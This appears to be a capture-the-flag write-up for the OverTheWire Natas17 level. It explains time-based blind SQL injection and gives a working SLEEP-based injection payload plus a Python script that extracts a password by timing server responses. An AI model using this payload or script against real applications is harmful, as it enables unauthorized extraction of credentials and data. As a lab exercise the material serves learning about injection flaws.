# Natas17
#natas #time-based-blind-sql-injection #blind-sql-injection 
## Vulnerability:

The application is vulnerable to **Time-Based Blind SQL Injection** because user input is directly concatenated into an SQL query. Unlike normal SQL injection, the application does not reveal the query result, so we cannot use the response content to determine whether a condition is true or false. Instead, we use database functions such as `SLEEP()` to create a time delay when a condition is true. By measuring the response time, we can extract information from the database.
## Technique:
We used the same method as [[Natas15]], except that in this level, the web application doesn't provide any visible output indicating whether the SQL query condition is true or false. So we modified it to make the true/false results behave differently, using `SLEEP`.
The type of commands we used in this level is :
```
natas18" AND IF (password LIKE BINARY "a%", SLEEP(3),0) #
```
The payload checks whether the password starts with a specific character. If the condition is true, `SLEEP(3)` delays the response; otherwise, the query executes normally.

**Python script:**
```python
import requests  
import string  
import time  
  
url = "http://natas17.natas.labs.overthewire.org/index.php"  
  
auth = ("natas17", <NATAS16_PASSWORD>)  
  
chars = string.ascii_letters + string.digits  
  
password = ""  
  
for position in range(32):  
    for c in chars:  
  
        d = {  
            "username": f'natas18" AND IF (password LIKE BINARY "{password}{c}%", SLEEP(3),0) #'  
        }  
        start = time.time()  
        r = requests.post(url, data=d, auth=auth)  
        end = time.time()  
        if end - start >= 3:  
            password += c  
            if position % 10 == 0 or position == 31:  
                print(f"[{position}] Password: {password}")  
            break
```
**Result:**
```
[0] Password: f
[10] Password: f----------
[20] Password: f--------------------
[30] Password: f------------------------------
[31] Password: f------------------------------p
```
## Password found:
[Not disclosed — solve it yourself!]
##  Previous Level:
[Natas16](./Natas16.md)
## Next Level:
[Natas18](./Natas18.md)
